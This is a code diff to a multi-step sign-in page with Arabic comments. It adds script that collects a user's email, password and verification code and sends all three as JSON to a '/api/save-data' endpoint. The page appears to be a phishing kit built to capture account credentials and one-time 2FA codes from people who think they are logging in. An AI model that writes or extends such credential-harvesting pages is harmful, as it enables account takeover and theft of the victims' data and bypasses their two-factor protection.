@@ -244,7 +244,7 @@
     </div>
   </div>
 
-  <script>
+<script>
     const step1Form = document.getElementById('step1Form');
     const step2Form = document.getElementById('step2Form');
     const step3Form = document.getElementById('step3Form');
@@ -255,29 +255,57 @@
 
     const emailInput = document.getElementById('emailInput');
     const passwordInput = document.getElementById('passwordInput');
+    const codeInput = document.getElementById('codeInput');
     const userEmailDisplay = document.getElementById('userEmailDisplay');
     const successMsg = document.getElementById('success-message');
 
-    // الإنتقال من البريد إلى كلمة السر
+    // تخزين البيانات مؤقتاً
+    let formData = {
+      email: '',
+      password: '',
+      code: ''
+    };
+
+    // الخطوة 1: حفظ الإيميل والانتقال لكلمة السر
     step1Form.addEventListener('submit', function(e) {
       e.preventDefault();
-      userEmailDisplay.textContent = emailInput.value;
+      formData.email = emailInput.value;
+      userEmailDisplay.textContent = formData.email;
       step1Form.style.display = 'none';
       step2Div.style.display = 'block';
     });
 
-    // الإنتقال من كلمة السر إلى كود التحقق
+    // الخطوة 2: حفظ كلمة السر والانتقال للكود
     step2Form.addEventListener('submit', function(e) {
       e.preventDefault();
+      formData.password = passwordInput.value;
       step2Form.style.display = 'none';
       step3Div.style.display = 'block';
     });
 
-    // إتمام العملية
+    // الخطوة 3: حفظ الكود وإرسال البيانات كلها للسيرفر
     step3Form.addEventListener('submit', function(e) {
       e.preventDefault();
-      step3Form.style.display = 'none';
-      successMsg.style.display = 'block';
+      formData.code = codeInput.value;
+
+      // إرسال البيانات عبر Fetch إلى السيرفر
+      fetch('/api/save-data', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(formData)
+      })
+      .then(response => response.json())
+      .then(data => {
+        if(data.status === 'success') {
+          step3Form.style.display = 'none';
+          successMsg.style.display = 'block';
+        }
+      })
+      .catch(error => {
+        console.error('Error:', error);
+      });
     });
 
     function togglePassword() {
